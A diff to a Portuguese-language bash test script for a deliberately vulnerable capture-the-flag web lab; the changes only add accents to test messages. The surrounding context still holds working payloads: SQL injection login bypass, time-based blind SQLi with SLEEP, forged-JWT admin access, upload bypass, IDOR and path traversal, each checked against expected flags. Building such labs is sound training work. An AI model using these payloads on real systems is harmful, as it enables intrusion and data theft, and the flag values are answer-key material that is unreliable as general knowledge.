@@ -86,15 +86,15 @@ check_status 'login responde 200' '200' "$BASE_URL/login"
 login_sqli_response="$(curl -sS -X POST "$BASE_URL/login" \
   -d "username=admin' OR '1'='1'--" \
   -d 'password=x' || true)"
-check_contains 'login rejeita SQLi basica e aponta recover' "$login_sqli_response" 'recuperacao'
+check_contains 'login rejeita SQLi básica e aponta recover' "$login_sqli_response" 'recuperação'
 
 login_status="$(curl -sS -c "$COOKIE_JAR" -o /dev/null -w '%{http_code}' -X POST "$BASE_URL/login" \
   -d 'username=nova' \
   -d 'password=nova2099' || true)"
 if [ "$login_status" = '302' ]; then
-  ok 'login nova/nova2099 gera sessao'
+  ok 'login nova/nova2099 gera sessão'
 else
-  fail "login nova/nova2099 gera sessao (status $login_status)"
+  fail "login nova/nova2099 gera sessão (status $login_status)"
 fi
 
 for route in dashboard profile logs files messages/preview avatar tools/webhook; do
@@ -103,8 +103,8 @@ done
 
 valid_check="$(curl -sS -G "$BASE_URL/api/check-user" --data-urlencode 'username=nova' || true)"
 invalid_check="$(curl -sS -G "$BASE_URL/api/check-user" --data-urlencode 'username=ghost' || true)"
-check_contains '/api/check-user reconhece usuario valido' "$valid_check" '"exists":true'
-check_contains '/api/check-user reconhece usuario invalido' "$invalid_check" '"exists":false'
+check_contains '/api/check-user reconhece usuário válido' "$valid_check" '"exists":true'
+check_contains '/api/check-user reconhece usuário inválido' "$invalid_check" '"exists":false'
 
 true_delay="$(elapsed_ms_for_check_user "admin' AND IF(SUBSTR(recovery_code,1,1)='N',SLEEP(1),0)--")"
 false_delay="$(elapsed_ms_for_check_user "admin' AND IF(SUBSTR(recovery_code,1,1)='X',SLEEP(1),0)--")"
@@ -121,9 +121,9 @@ check_contains 'recover admin/N3ON revela flag blind SQLi' "$recover_response" '
 
 admin_user_status="$(curl -sS -b "$COOKIE_JAR" -o /dev/null -w '%{http_code}' "$BASE_URL/admin/core" || true)"
 if [ "$admin_user_status" = '403' ]; then
-  ok '/admin/core bloqueia usuario comum'
+  ok '/admin/core bloqueia usuário comum'
 else
-  fail "/admin/core bloqueia usuario comum (status $admin_user_status)"
+  fail "/admin/core bloqueia usuário comum (status $admin_user_status)"
 fi
 
 if command -v docker >/dev/null 2>&1; then
@@ -136,7 +136,7 @@ if [ -n "$token" ]; then
   jwt_response="$(curl -sS -H "Authorization: Bearer $token" "$BASE_URL/admin/core" || true)"
   check_contains 'JWT admin forjado acessa /admin/core' "$jwt_response" 'FLAG{jwt_forged_neon_admin}'
 else
-  fail 'JWT admin forjado acessa /admin/core (docker compose exec nao gerou token)'
+  fail 'JWT admin forjado acessa /admin/core (docker compose exec não gerou token)'
 fi
 
 ssrf_status_response="$(curl -sS -b "$COOKIE_JAR" -X POST "$BASE_URL/tools/webhook" \
@@ -163,7 +163,7 @@ check_contains 'upload normal .png aceito' "$upload_normal" 'Arquivo aceito'
 printf 'not allowed' > "$TMP_DIR/payload.exe"
 upload_invalid="$(curl -sS -b "$COOKIE_JAR" -X POST "$BASE_URL/avatar" \
   -F "avatar=@$TMP_DIR/payload.exe;filename=payload.exe" || true)"
-check_contains 'upload invalido simples rejeitado' "$upload_invalid" 'Extensao recusada'
+check_contains 'upload inválido simples rejeitado' "$upload_invalid" 'Extensão recusada'
 
 printf '<h1>NEON_UPLOAD_PROBE</h1>' > "$TMP_DIR/badge.html"
 upload_bypass="$(curl -sS -b "$COOKIE_JAR" -X POST "$BASE_URL/avatar" \
@@ -179,14 +179,14 @@ if [ -n "$latest_upload" ]; then
     fail "/uploads/:name funciona autenticado (status $upload_fetch_status)"
   fi
 else
-  fail '/uploads/:name funciona autenticado (URL do upload nao encontrada)'
+  fail '/uploads/:name funciona autenticado (URL do upload não encontrada)'
 fi
 
 logs_normal="$(curl -sS -b "$COOKIE_JAR" "$BASE_URL/logs?level=error" || true)"
 if printf '%s' "$logs_normal" | grep -Fq 'FLAG{logs_filter_sqli}'; then
-  fail 'logs normais nao revelam flag oculta'
+  fail 'logs normais não revelam flag oculta'
 else
-  ok 'logs normais nao revelam flag oculta'
+  ok 'logs normais não revelam flag oculta'
 fi
 
 logs_injected="$(curl -sS -b "$COOKIE_JAR" -G "$BASE_URL/logs" \
@@ -195,7 +195,7 @@ check_contains 'logs SQLi revela log oculto' "$logs_injected" 'FLAG{logs_filter_
 
 ticket_own="$(curl -sS -b "$COOKIE_JAR" "$BASE_URL/api/tickets/101" || true)"
 ticket_admin="$(curl -sS -b "$COOKIE_JAR" "$BASE_URL/api/tickets/777" || true)"
-check_contains 'API tickets retorna ticket proprio' "$ticket_own" '"ownerId":2'
+check_contains 'API tickets retorna ticket próprio' "$ticket_own" '"ownerId":2'
 check_contains 'API IDOR retorna ticket admin' "$ticket_admin" 'FLAG{api_idor_object_leak}'
 
 download_report="$(curl -sS "$BASE_URL/download?file=report.pdf" || true)"
@@ -208,15 +208,15 @@ download_backup="$(curl -sS "$BASE_URL/download?file=../../backup/legacy-admin-n
 check_contains 'path traversal segue backup e revela flag' "$download_backup" 'FLAG{traversal_follow_the_logs}'
 
 if docker compose config 2>/dev/null | grep -Fq 'published: "5000"'; then
-  fail 'porta 5000 nao publicada no docker-compose'
+  fail 'porta 5000 não publicada no docker-compose'
 else
-  ok 'porta 5000 nao publicada no docker-compose'
+  ok 'porta 5000 não publicada no docker-compose'
 fi
 
 if grep -R "FLAG{" README.md >/dev/null 2>&1; then
-  fail 'README nao contem flags'
+  fail 'README não contém flags'
 else
-  ok 'README nao contem flags'
+  ok 'README não contém flags'
 fi
 
 printf '\nResultado: %s OK, %s FAIL\n' "$PASS_COUNT" "$FAIL_COUNT"
